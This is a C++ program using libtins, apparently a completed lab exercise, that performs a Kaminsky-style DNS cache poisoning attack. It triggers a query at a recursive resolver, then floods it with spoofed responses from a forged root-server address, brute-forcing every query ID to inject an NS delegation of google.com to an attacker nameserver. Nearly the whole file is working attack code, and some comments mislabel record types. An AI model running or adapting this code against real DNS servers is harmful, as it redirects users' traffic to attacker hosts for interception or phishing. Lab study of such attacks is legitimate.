#include <tins/tins.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>

using namespace Tins;
using namespace std;

int main() {

    srand(time(0));    // Seed random number generator for DNS query ID

    // Configuration variables
    string victim_domain = "google.com";
    string request_hostname = "www.google.com";    // Target domain to spoof
    string root_dns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS) - string root_dns_ip = "TODO";
    string recursive_dns_ip = "10.0.0.40";    // Target recursive DNS server
    string attacker_ip = "10.0.0.10";
    string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
    string attacker_ns = "attacker.google.com";
    string attacker_dns_ip = "10.0.0.70";
    int recursive_dns_port = 12345;    // Port of recursive DNS server - int recursive_dns_port = TODO;

    PacketSender sender;    // Packet sending utility from libtins

    /**********************************************
     * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
     **********************************************/

    // Create DNS query packet
    DNS dns;
    dns.id(rand() % 65536);    // Random query ID - dns.id(rand() % TODO);
    dns.type(DNS::QUERY);    // This is a query packet
    dns.recursion_desired(1);    // Set RD flag to true
    dns.add_query(DNS::Query(
        request_hostname,    // Domain to query
        DNS::A,    // IPv4 address record - DNS::TODO
        DNS::IN    // Internet class (standard)
    ));

    UDP udp(53, 53);    // Create UDP layer (destination/source port 53)
    udp /= dns;    // Attach DNS payload

    // IP(destination_ip,source_ip)
    IP ip = IP(recursive_dns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server - IP ip = IP(TODO, attacker_server_ip) / udp;

    sender.send(ip);    // Send the initial legitimate query

    /**********************************************
     * STEP 2: DNS cache poisoning attack
     * Flood with spoofed responses trying to guess the correct query ID
     **********************************************/
    std::this_thread::sleep_for(std::chrono::milliseconds(721));
    for (int id = 0; id <= 65535; ++id) {
        // Create spoofed DNS answer packet
        DNS dns;
        dns.id(id);    // Try all possible IDs (brute force)
        dns.type(DNS::RESPONSE);    // This is a response packet
        dns.add_query(DNS::Query("_.google.com", DNS::A, DNS::IN));    // Same as the previous query

        dns.add_authority(DNS::Resource(victim_domain, attacker_ns, DNS::NS, DNS::IN, 6000));

        dns.add_additional(DNS::Resource(
            attacker_ns,           // dominio richiesto (es: google.com)
            attacker_dns_ip,          // il tuo server NS "malevolo"
            DNS::A,                    // tipo NS
            DNS::IN,                    // classe Internet
            6000                          // TTL
        ));

        dns.add_additional(DNS::Resource(
            attacker_ns,
            "2001:db8::1",
            DNS::AAAA,
            DNS::IN,
            6000
        ));

        UDP udp(recursive_dns_port, 53);    // Create UDP layer (source port: 53, destination port 12345) - UDP udp(TODO, 53);
        udp /= dns;    // Attach DNS payload

        IP ip = IP(recursive_dns_ip, root_dns_ip) / udp;  // Create IP layer targeting recursive DNS server - IP ip = IP(recursive_dns_ip, TODO) / udp;

        sender.send(ip); // Send the spoofed response
        if (id % 1000 == 0) {
            cout << "Sent packet ID: " << id << endl;
        }
    }

    return 0;
}